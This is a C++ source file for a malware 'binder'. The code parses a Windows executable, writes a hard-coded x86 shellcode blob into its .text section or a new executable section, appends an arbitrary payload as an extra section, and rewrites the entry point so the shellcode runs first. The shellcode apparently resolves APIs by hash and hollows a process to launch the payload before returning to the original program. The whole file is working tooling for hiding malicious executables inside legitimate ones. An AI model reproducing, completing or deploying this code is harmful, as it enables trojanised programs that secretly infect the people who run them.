#include "Binder.h"

Binder *Binder::instance = nullptr;

Binder::Binder() {
	this->shellcode = std::vector<BYTE>{ 0x50, 0x41, 0x59, 0x4C, 0x4F, 0x41, 0x44, 0x00, 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x5A, 0x77, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4F, 0x66, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5A, 0xC3, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x14, 0x8B, 0x00, 0x8B, 0x00, 0x8B, 0x40, 0x10, 0xC3, 0xE8, 0xE0, 0xFF, 0xFF, 0xFF, 0x83, 0xEA, 0x2C, 0x89, 0xD0, 0xC3, 0xE8, 0xD5, 0xFF, 0xFF, 0xFF, 0x83, 0xEA, 0x24, 0x89, 0xD0, 0xC3, 0xE8, 0xCA, 0xFF, 0xFF, 0xFF, 0x83, 0xEA, 0x1A, 0x89, 0xD0, 0xC3, 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x10, 0xC7, 0x45, 0xFC, 0xFF, 0xFF, 0xFF, 0xFF, 0xEB, 0x43, 0x8B, 0x45, 0x08, 0x8D, 0x50, 0x01, 0x89, 0x55, 0x08, 0x0F, 0xB6, 0x00, 0x0F, 0xBE, 0xC0, 0x31, 0x45, 0xFC, 0xC7, 0x45, 0xF8, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x22, 0x8B, 0x45, 0xFC, 0x83, 0xE0, 0x01, 0x85, 0xC0, 0x74, 0x0C, 0x8B, 0x45, 0xFC, 0xD1, 0xE8, 0x35, 0x20, 0x83, 0xB8, 0xED, 0xEB, 0x05, 0x8B, 0x45, 0xFC, 0xD1, 0xE8, 0x89, 0x45, 0xFC, 0x83, 0x45, 0xF8, 0x01, 0x83, 0x7D, 0xF8, 0x07, 0x7E, 0xD8, 0x8B, 0x45, 0x0C, 0x8D, 0x50, 0xFF, 0x89, 0x55, 0x0C, 0x85, 0xC0, 0x75, 0xB0, 0x8B, 0x45, 0xFC, 0xF7, 0xD0, 0xC9, 0xC3, 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x10, 0x8B, 0x45, 0x08, 0x89, 0x45, 0xFC, 0xC7, 0x45, 0xF8, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x12, 0x8B, 0x45, 0x0C, 0x89, 0xC2, 0x8B, 0x45, 0xFC, 0x88, 0x10, 0x83, 0x45, 0xFC, 0x01, 0x83, 0x6D, 0x10, 0x01, 0x83, 0x7D, 0x10, 0x00, 0x7F, 0xE8, 0x8B, 0x45, 0x08, 0xC9, 0xC3, 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x10, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x55, 0xFC, 0x8B, 0x45, 0x08, 0x01, 0xD0, 0x0F, 0xB6, 0x00, 0x84, 0xC0, 0x75, 0x05, 0x8B, 0x45, 0xFC, 0xEB, 0x06, 0x83, 0x45, 0xFC, 0x01, 0xEB, 0xE6, 0xC9, 0xC3, 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x14, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x25, 0x8B, 0x55, 0xFC, 0x8B, 0x45, 0x08, 0x01, 0xD0, 0x0F, 0xB6, 0x10, 0x8B, 0x4D, 0xFC, 0x8B, 0x45, 0x0C, 0x01, 0xC8, 0x0F, 0xB6, 0x00, 0x38, 0xC2, 0x74, 0x07, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xEB, 0x19, 0x83, 0x45, 0xFC, 0x01, 0x8B, 0x45, 0x08, 0x89, 0x04, 0x24, 0xE8, 0x98, 0xFF, 0xFF, 0xFF, 0x3B, 0x45, 0xFC, 0x7F, 0xCB, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC9, 0xC3, 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x48, 0xE8, 0xB4, 0xFE, 0xFF, 0xFF, 0x89, 0x45, 0xF0, 0x8B, 0x45, 0xF0, 0x89, 0x45, 0xEC, 0x8B, 0x45, 0xEC, 0x8B, 0x40, 0x3C, 0x89, 0xC2, 0x8B, 0x45, 0xF0, 0x01, 0xD0, 0x89, 0x45, 0xE8, 0x8B, 0x45, 0xE8, 0x8B, 0x50, 0x78, 0x8B, 0x45, 0xF0, 0x01, 0xD0, 0x89, 0x45, 0xE4, 0x8B, 0x45, 0xE4, 0x8B, 0x50, 0x1C, 0x8B, 0x45, 0xF0, 0x01, 0xD0, 0x89, 0x45, 0xE0, 0x8B, 0x45, 0xE4, 0x8B, 0x50, 0x20, 0x8B, 0x45, 0xF0, 0x01, 0xD0, 0x89, 0x45, 0xDC, 0x8B, 0x45, 0xE4, 0x8B, 0x50, 0x24, 0x8B, 0x45, 0xF0, 0x01, 0xD0, 0x89, 0x45, 0xD8, 0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x62, 0x8B, 0x45, 0xF4, 0x8D, 0x14, 0x85, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x45, 0xDC, 0x01, 0xD0, 0x8B, 0x10, 0x8B, 0x45, 0xF0, 0x01, 0xD0, 0x89, 0x45, 0xD4, 0x8B, 0x45, 0xD4, 0x89, 0x04, 0x24, 0xE8, 0x03, 0xFF, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x04, 0x8B, 0x45, 0xD4, 0x89, 0x04, 0x24, 0xE8, 0x5C, 0xFE, 0xFF, 0xFF, 0x3B, 0x45, 0x08, 0x75, 0x26, 0x8B, 0x45, 0xF4, 0x8D, 0x14, 0x00, 0x8B, 0x45, 0xD8, 0x01, 0xD0, 0x0F, 0xB7, 0x00, 0x0F, 0xB7, 0xC0, 0x8D, 0x14, 0x85, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x45, 0xE0, 0x01, 0xD0, 0x8B, 0x10, 0x8B, 0x45, 0xF0, 0x01, 0xD0, 0xEB, 0x16, 0x83, 0x45, 0xF4, 0x01, 0x8B, 0x55, 0xF4, 0x8B, 0x45, 0xE4, 0x8B, 0x40, 0x18, 0x39, 0xC2, 0x72, 0x91, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC9, 0xC3, 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x10, 0x8B, 0x45, 0x08, 0x89, 0x45, 0xFC, 0x8B, 0x45, 0xFC, 0x8B, 0x40, 0x3C, 0x89, 0xC2, 0x8B, 0x45, 0x08, 0x01, 0xD0, 0x89, 0x45, 0xF8, 0x8B, 0x45, 0xF8, 0x0F, 0xB7, 0x40, 0x14, 0x0F, 0xB7, 0xD0, 0x8B, 0x45, 0xF8, 0x01, 0xD0, 0x83, 0xC0, 0x18, 0x89, 0x45, 0xF4, 0x8B, 0x45, 0xF8, 0x0F, 0xB7, 0x40, 0x06, 0x0F, 0xB7, 0xD0, 0x89, 0xD0, 0xC1, 0xE0, 0x02, 0x01, 0xD0, 0xC1, 0xE0, 0x03, 0x8D, 0x50, 0xD8, 0x8B, 0x45, 0xF4, 0x01, 0xD0, 0x89, 0x45, 0xF0, 0x8B, 0x45, 0xF8, 0x8B, 0x50, 0x34, 0x8B, 0x45, 0xF0, 0x8B, 0x40, 0x0C, 0x01, 0xD0, 0xC9, 0xC3, 0x55, 0x89, 0xE5, 0x53, 0x81, 0xEC, 0x94, 0x04, 0x00, 0x00, 0xC7, 0x04, 0x24, 0xA0, 0xF7, 0xBF, 0x08, 0xE8, 0xAF, 0xFE, 0xFF, 0xFF, 0x89, 0x45, 0xF0, 0xC7, 0x44, 0x24, 0x08, 0x04, 0x01, 0x00, 0x00, 0x8D, 0x85, 0xB8, 0xFE, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x04, 0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x45, 0xF0, 0xFF, 0xD0, 0x83, 0xEC, 0x0C, 0x8B, 0x45, 0x08, 0x89, 0x45, 0xEC, 0x8B, 0x45, 0xEC, 0x8B, 0x40, 0x3C, 0x89, 0xC2, 0x8B, 0x45, 0x08, 0x01, 0xD0, 0x89, 0x45, 0xE8, 0x8B, 0x45, 0xE8, 0x8B, 0x00, 0x3D, 0x50, 0x45, 0x00, 0x00, 0x74, 0x0A, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x29, 0x03, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x08, 0x10, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x8D, 0x85, 0x64, 0xFE, 0xFF, 0xFF, 0x89, 0x04, 0x24, 0xE8, 0x9B, 0xFD, 0xFF, 0xFF, 0xC7, 0x44, 0x24, 0x08, 0x44, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x8D, 0x85, 0x74, 0xFE, 0xFF, 0xFF, 0x89, 0x04, 0x24, 0xE8, 0x7D, 0xFD, 0xFF, 0xFF, 0xC7, 0x85, 0x74, 0xFE, 0xFF, 0xFF, 0x44, 0x00, 0x00, 0x00, 0xC7, 0x85, 0xA0, 0xFE, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x66, 0xC7, 0x85, 0xA4, 0xFE, 0xFF, 0xFF, 0x05, 0x00, 0xC7, 0x04, 0x24, 0x16, 0xD9, 0x51, 0xA8, 0xE8, 0xFA, 0xFD, 0xFF, 0xFF, 0x89, 0x45, 0xE4, 0x8D, 0x85, 0x64, 0xFE, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x24, 0x8D, 0x85, 0x74, 0xFE, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x20, 0xC7, 0x44, 0x24, 0x1C, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x18, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x14, 0x0C, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x0C, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x8D, 0x85, 0xB8, 0xFE, 0xFF, 0xFF, 0x89, 0x04, 0x24, 0x8B, 0x45, 0xE4, 0xFF, 0xD0, 0x83, 0xEC, 0x28, 0x85, 0xC0, 0x75, 0x0A, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x56, 0x02, 0x00, 0x00, 0xC7, 0x85, 0x98, 0xFB, 0xFF, 0xFF, 0x07, 0x00, 0x01, 0x00, 0xC7, 0x04, 0x24, 0xC1, 0xB9, 0x9E, 0x64, 0xE8, 0x76, 0xFD, 0xFF, 0xFF, 0x89, 0x45, 0xE0, 0x8B, 0x85, 0x68, 0xFE, 0xFF, 0xFF, 0x8D, 0x95, 0x98, 0xFB, 0xFF, 0xFF, 0x89, 0x54, 0x24, 0x04, 0x89, 0x04, 0x24, 0x8B, 0x45, 0xE0, 0xFF, 0xD0, 0x83, 0xEC, 0x08, 0x85, 0xC0, 0x75, 0x0A, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x14, 0x02, 0x00, 0x00, 0xC7, 0x04, 0x24, 0xFF, 0x1F, 0x7C, 0xC9, 0xE8, 0x3E, 0xFD, 0xFF, 0xFF, 0x89, 0x45, 0xDC, 0xC7, 0x04, 0x24, 0x70, 0x65, 0x86, 0xB1, 0xE8, 0x2F, 0xFD, 0xFF, 0xFF, 0x89, 0x45, 0xD8, 0xE8, 0x10, 0xFC, 0xFF, 0xFF, 0x89, 0xC3, 0xE8, 0xFE, 0xFB, 0xFF, 0xFF, 0x89, 0x04, 0x24, 0x8B, 0x45, 0xD8, 0xFF, 0xD0, 0x83, 0xEC, 0x04, 0x89, 0x5C, 0x24, 0x04, 0x89, 0x04, 0x24, 0x8B, 0x45, 0xDC, 0xFF, 0xD0, 0x83, 0xEC, 0x08, 0x89, 0x45, 0xD4, 0x8B, 0x45, 0xE8, 0x8B, 0x40, 0x34, 0x89, 0xC2, 0x8B, 0x85, 0x64, 0xFE, 0xFF, 0xFF, 0x89, 0x54, 0x24, 0x04, 0x89, 0x04, 0x24, 0x8B, 0x45, 0xD4, 0xFF, 0xD0, 0x83, 0xEC, 0x08, 0xC7, 0x04, 0x24, 0x4D, 0x82, 0x2E, 0xE6, 0xE8, 0xDA, 0xFC, 0xFF, 0xFF, 0x89, 0x45, 0xD0, 0x8B, 0x45, 0xE8, 0x8B, 0x48, 0x50, 0x8B, 0x45, 0xE8, 0x8B, 0x40, 0x34, 0x89, 0xC2, 0x8B, 0x85, 0x64, 0xFE, 0xFF, 0xFF, 0xC7, 0x44, 0x24, 0x10, 0x40, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x0C, 0x00, 0x30, 0x00, 0x00, 0x89, 0x4C, 0x24, 0x08, 0x89, 0x54, 0x24, 0x04, 0x89, 0x04, 0x24, 0x8B, 0x45, 0xD0, 0xFF, 0xD0, 0x83, 0xEC, 0x14, 0x89, 0x45, 0xCC, 0x83, 0x7D, 0xCC, 0x00, 0x75, 0x0A, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x57, 0x01, 0x00, 0x00, 0xC7, 0x04, 0x24, 0x2E, 0x97, 0x58, 0x4F, 0xE8, 0x81, 0xFC, 0xFF, 0xFF, 0x89, 0x45, 0xC8, 0x8B, 0x45, 0xE8, 0x8B, 0x48, 0x54, 0x8B, 0x45, 0xE8, 0x8B, 0x40, 0x34, 0x89, 0xC2, 0x8B, 0x85, 0x64, 0xFE, 0xFF, 0xFF, 0xC7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00, 0x00, 0x89, 0x4C, 0x24, 0x0C, 0x8B, 0x4D, 0x08, 0x89, 0x4C, 0x24, 0x08, 0x89, 0x54, 0x24, 0x04, 0x89, 0x04, 0x24, 0x8B, 0x45, 0xC8, 0xFF, 0xD0, 0x83, 0xEC, 0x14, 0x85, 0xC0, 0x75, 0x0A, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x04, 0x01, 0x00, 0x00, 0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x71, 0x8B, 0x45, 0xEC, 0x8B, 0x40, 0x3C, 0x89, 0xC2, 0x8B, 0x45, 0x08, 0x8D, 0x0C, 0x02, 0x8B, 0x55, 0xF4, 0x89, 0xD0, 0xC1, 0xE0, 0x02, 0x01, 0xD0, 0xC1, 0xE0, 0x03, 0x01, 0xC8, 0x05, 0xF8, 0x00, 0x00, 0x00, 0x89, 0x45, 0xC4, 0x8B, 0x45, 0xC4, 0x8B, 0x58, 0x10, 0x8B, 0x45, 0xC4, 0x8B, 0x50, 0x14, 0x8B, 0x45, 0x08, 0x01, 0xD0, 0x89, 0xC1, 0x8B, 0x45, 0xE8, 0x8B, 0x50, 0x34, 0x8B, 0x45, 0xC4, 0x8B, 0x40, 0x0C, 0x01, 0xD0, 0x89, 0xC2, 0x8B, 0x85, 0x64, 0xFE, 0xFF, 0xFF, 0xC7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00, 0x00, 0x89, 0x5C, 0x24, 0x0C, 0x89, 0x4C, 0x24, 0x08, 0x89, 0x54, 0x24, 0x04, 0x89, 0x04, 0x24, 0x8B, 0x45, 0xC8, 0xFF, 0xD0, 0x83, 0xEC, 0x14, 0x83, 0x45, 0xF4, 0x01, 0x8B, 0x45, 0xE8, 0x0F, 0xB7, 0x40, 0x06, 0x0F, 0xB7, 0xC0, 0x3B, 0x45, 0xF4, 0x7F, 0x80, 0x8B, 0x45, 0xE8, 0x8B, 0x50, 0x34, 0x8B, 0x45, 0xE8, 0x8B, 0x40, 0x28, 0x01, 0xD0, 0x89, 0x85, 0x48, 0xFC, 0xFF, 0xFF, 0xC7, 0x04, 0x24, 0xD8, 0xCB, 0x88, 0x56, 0xE8, 0x91, 0xFB, 0xFF, 0xFF, 0x89, 0x45, 0xC0, 0x8B, 0x85, 0x68, 0xFE, 0xFF, 0xFF, 0x8D, 0x95, 0x98, 0xFB, 0xFF, 0xFF, 0x89, 0x54, 0x24, 0x04, 0x89, 0x04, 0x24, 0x8B, 0x45, 0xC0, 0xFF, 0xD0, 0x83, 0xEC, 0x08, 0x85, 0xC0, 0x75, 0x07, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x32, 0xC7, 0x04, 0x24, 0xB9, 0xBE, 0x72, 0x38, 0xE8, 0x5C, 0xFB, 0xFF, 0xFF, 0x89, 0x45, 0xBC, 0x8B, 0x85, 0x68, 0xFE, 0xFF, 0xFF, 0x89, 0x04, 0x24, 0x8B, 0x45, 0xBC, 0xFF, 0xD0, 0x83, 0xEC, 0x04, 0x83, 0xF8, 0xFF, 0x75, 0x07, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x06, 0x8B, 0x85, 0x64, 0xFE, 0xFF, 0xFF, 0x8B, 0x5D, 0xFC, 0xC9, 0xC3, 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x28, 0xC7, 0x04, 0x24, 0x70, 0x65, 0x86, 0xB1, 0xE8, 0x1F, 0xFB, 0xFF, 0xFF, 0x89, 0x45, 0xF4, 0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x45, 0xF4, 0xFF, 0xD0, 0x83, 0xEC, 0x04, 0x89, 0x04, 0x24, 0xE8, 0xE0, 0xFB, 0xFF, 0xFF, 0x89, 0x45, 0xF0, 0x83, 0x7D, 0xF0, 0x00, 0x74, 0x20, 0x8B, 0x45, 0xF0, 0x89, 0x04, 0x24, 0xE8, 0x2C, 0xFC, 0xFF, 0xFF, 0x89, 0x45, 0xEC, 0x83, 0x7D, 0xEC, 0x00, 0x74, 0x0C, 0xC7, 0x45, 0xE8, 0x69, 0x69, 0x69, 0x69, 0x8B, 0x45, 0xE8, 0xFF, 0xD0, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC9, 0xC3 };
}

Binder * Binder::GetInstance() {
	if (!instance)
		instance = new Binder();
	return instance;
}

void Binder::SetTargetFile(std::wstring target) {
	this->targetFileName = target;
}

void Binder::SetPayloadFile(std::wstring payload) {
	this->payloadFileName = payload;
}

void Binder::SetOutputFile(std::wstring output) {
	this->outputFileName = output;
}

bool Binder::Bind() {
	// open file for read
	HANDLE hFile = ::CreateFile(this->targetFileName.c_str(), GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;

	// read file, assume shellcode can fit inside .text section
	DWORD dwFileSize = ::GetFileSize(hFile, nullptr);
	std::vector<BYTE> target(dwFileSize);
	DWORD dwBytesRead = 0;
	if (!::ReadFile(hFile, &target[0], dwFileSize, &dwBytesRead, nullptr))
		return false;

	::CloseHandle(hFile);

	// read payload file
	HANDLE hPayloadFile = ::CreateFile(this->payloadFileName.c_str(), GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hPayloadFile == INVALID_HANDLE_VALUE)
		return false;

	DWORD dwPayloadSize = ::GetFileSize(hPayloadFile, nullptr);
	std::vector<BYTE> payload(dwPayloadSize);
	if (!::ReadFile(hPayloadFile, &payload[0], dwPayloadSize, &dwBytesRead, nullptr)) {
		::CloseHandle(hPayloadFile);
		return false;
	}

	::CloseHandle(hPayloadFile);

	// parse headers
	// get DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)target.data();
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)target.data() + pidh->e_lfanew);

	// find .text section
	PIMAGE_SECTION_HEADER pishText = IMAGE_FIRST_SECTION(pinh);

	// if .text section space >= shellcode size
	std::vector<BYTE> output;
	DWORD dwOEP = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
	if (pishText->SizeOfRawData - pishText->Misc.VirtualSize >= this->shellcode.size()) {
		// append into .text section
		::CopyMemory(target.data() + pinh->OptionalHeader.SizeOfHeaders + pishText->Misc.VirtualSize, this->shellcode.data(), this->shellcode.size());

		// update address of entry point
		DWORD dwOffetToShellcode = pinh->OptionalHeader.SizeOfHeaders + pishText->Misc.VirtualSize;
		DWORD dwNewEntryPoint = dwOffetToShellcode + SHELLCODE_START_OFFSET;
		pinh->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;

		// update OEP in shellcode
		::CopyMemory(target.data() + dwOffetToShellcode + SHELLCODE_START_OFFSET + SHELLCODE_OEP_OFFSET, &dwOEP, sizeof(dwOEP));
		
		// update virtual size
		pishText->Misc.VirtualSize += this->shellcode.size();

		// copy to output vector
		output.insert(output.end(), target.begin(), target.end());

		// append new payload section
		// check space for new section header
		// get DOS header
		pidh = (PIMAGE_DOS_HEADER)output.data();
		// get NT headers
		pinh = (PIMAGE_NT_HEADERS)((DWORD)output.data() + pidh->e_lfanew);

		// find .text section
		pishText = IMAGE_FIRST_SECTION(pinh);
		// get last IMAGE_SECTION_HEADER
		PIMAGE_SECTION_HEADER pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 1));
		PIMAGE_SECTION_HEADER pishNew = (PIMAGE_SECTION_HEADER)((DWORD)pishLast + IMAGE_SIZEOF_SECTION_HEADER);
		if (pishText->PointerToRawData - (DWORD)pishNew < IMAGE_SIZEOF_SECTION_HEADER)
			return false;

		// create new section header
		IMAGE_SECTION_HEADER ishNew;
		::ZeroMemory(&ishNew, sizeof(ishNew));
		::CopyMemory(ishNew.Name, ".payload", 8);
		ishNew.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA;
		ishNew.SizeOfRawData = ALIGN(payload.size(), pinh->OptionalHeader.FileAlignment);
		ishNew.VirtualAddress = ALIGN((pishLast->VirtualAddress + pishLast->Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
		ishNew.PointerToRawData = ALIGN((pishLast->PointerToRawData + pishLast->SizeOfRawData), pinh->OptionalHeader.FileAlignment);
		ishNew.Misc.VirtualSize = payload.size();

		// fix headers' values
		pinh->FileHeader.NumberOfSections++;
		pinh->OptionalHeader.SizeOfImage = ALIGN((pinh->OptionalHeader.SizeOfImage + ishNew.Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
		// manually calculate size of headers; unreliable
		pinh->OptionalHeader.SizeOfHeaders = ALIGN((pinh->FileHeader.NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER), pinh->OptionalHeader.FileAlignment);

		// append new section header
		::CopyMemory(pishNew, &ishNew, IMAGE_SIZEOF_SECTION_HEADER);
		// append new section and copy to output
		output.insert(output.end(), payload.begin(), payload.end());

		// fill rest of section with 0
		for (DWORD i = 0; i < (ishNew.SizeOfRawData - payload.size()); i++)
			output.push_back(0);
	} else {
		// else create new executable section
		// check space for new section header
		// get last IMAGE_SECTION_HEADER
		PIMAGE_SECTION_HEADER pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 1));
		PIMAGE_SECTION_HEADER pishNew = (PIMAGE_SECTION_HEADER)((DWORD)pishLast + IMAGE_SIZEOF_SECTION_HEADER);
		if (pishText->PointerToRawData - (DWORD)pishNew < IMAGE_SIZEOF_SECTION_HEADER)
			return false;

		// create new section header
		IMAGE_SECTION_HEADER ishNew;
		::ZeroMemory(&ishNew, sizeof(ishNew));
		::CopyMemory(ishNew.Name, ".aids", 5);
		ishNew.Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
		ishNew.SizeOfRawData = ALIGN(this->shellcode.size(), pinh->OptionalHeader.FileAlignment);
		ishNew.VirtualAddress = ALIGN((pishLast->VirtualAddress + pishLast->Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
		ishNew.PointerToRawData = ALIGN((pishLast->PointerToRawData + pishLast->SizeOfRawData), pinh->OptionalHeader.FileAlignment);
		ishNew.Misc.VirtualSize = this->shellcode.size();

		// fix headers' values
		pinh->FileHeader.NumberOfSections++;
		pinh->OptionalHeader.SizeOfImage = ALIGN((pinh->OptionalHeader.SizeOfImage + ishNew.Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
		// manually calculate size of headers; unreliable
		pinh->OptionalHeader.SizeOfHeaders = ALIGN((pinh->FileHeader.NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER), pinh->OptionalHeader.FileAlignment);

		// append new section header
		::CopyMemory(pishNew, &ishNew, IMAGE_SIZEOF_SECTION_HEADER);
		// append new section and copy to output
		//output.reserve(target.size() + ishNew.PointerToRawData + ishNew.SizeOfRawData);
		output.insert(output.end(), target.begin(), target.end());
		output.insert(output.end(), this->shellcode.begin(), this->shellcode.end());
		// fill rest of section with 0
		for (DWORD i = 0; i < (ishNew.SizeOfRawData - this->shellcode.size()); i++)
			output.push_back(0);

		// append new payload section
		// check space for new section header
		// get DOS header
		pidh = (PIMAGE_DOS_HEADER)output.data();
		// get NT headers
		pinh = (PIMAGE_NT_HEADERS)((DWORD)output.data() + pidh->e_lfanew);

		// find .text section
		pishText = IMAGE_FIRST_SECTION(pinh);
		// get last IMAGE_SECTION_HEADER
		pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 1));
		pishNew = (PIMAGE_SECTION_HEADER)((DWORD)pishLast + IMAGE_SIZEOF_SECTION_HEADER);
		if (pishText->PointerToRawData - (DWORD)pishNew < IMAGE_SIZEOF_SECTION_HEADER)
			return false;

		// create new section header
		ishNew;
		::ZeroMemory(&ishNew, sizeof(ishNew));
		::CopyMemory(ishNew.Name, ".payload", 8);
		ishNew.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA;
		ishNew.SizeOfRawData = ALIGN(payload.size(), pinh->OptionalHeader.FileAlignment);
		ishNew.VirtualAddress = ALIGN((pishLast->VirtualAddress + pishLast->Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
		ishNew.PointerToRawData = ALIGN((pishLast->PointerToRawData + pishLast->SizeOfRawData), pinh->OptionalHeader.FileAlignment);
		ishNew.Misc.VirtualSize = payload.size();

		// fix headers' values
		pinh->FileHeader.NumberOfSections++;
		pinh->OptionalHeader.SizeOfImage = ALIGN((pinh->OptionalHeader.SizeOfImage + ishNew.Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
		pinh->OptionalHeader.SizeOfHeaders = ALIGN((pinh->OptionalHeader.SizeOfHeaders + IMAGE_SIZEOF_SECTION_HEADER), pinh->OptionalHeader.FileAlignment);

		// append new section header
		::CopyMemory(pishNew, &ishNew, IMAGE_SIZEOF_SECTION_HEADER);
		// append new section and copy to output
		output.insert(output.end(), payload.begin(), payload.end());

		// update address of entry point
		// redefine headers
		// get DOS header
		pidh = (PIMAGE_DOS_HEADER)output.data();
		// get NT headers
		pinh = (PIMAGE_NT_HEADERS)((DWORD)output.data() + pidh->e_lfanew);
		// find .text section
		pishText = IMAGE_FIRST_SECTION(pinh);
		// get .aids section (now is 2nd last)
		pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 2));
		PIMAGE_SECTION_HEADER pishAids = pishLast;

		// calculate new entry point
		DWORD dwNewEntryPoint = pishAids->VirtualAddress + SHELLCODE_START_OFFSET;
		pinh->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;

		// update OEP in shellcode
		::CopyMemory(output.data() + pishAids->PointerToRawData + SHELLCODE_START_OFFSET + SHELLCODE_OEP_OFFSET, &dwOEP, sizeof(dwOEP));
	}

	// write out to disk
	HANDLE hOutFile = ::CreateFile(this->outputFileName.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hOutFile == INVALID_HANDLE_VALUE)
		return false;

	DWORD dwBytesWritten = 0;
	if (!::WriteFile(hOutFile, output.data(), output.size(), &dwBytesWritten, nullptr)) {
		::CloseHandle(hOutFile);
		return false;
	}

	::CloseHandle(hOutFile);

	// done
	return true;
}
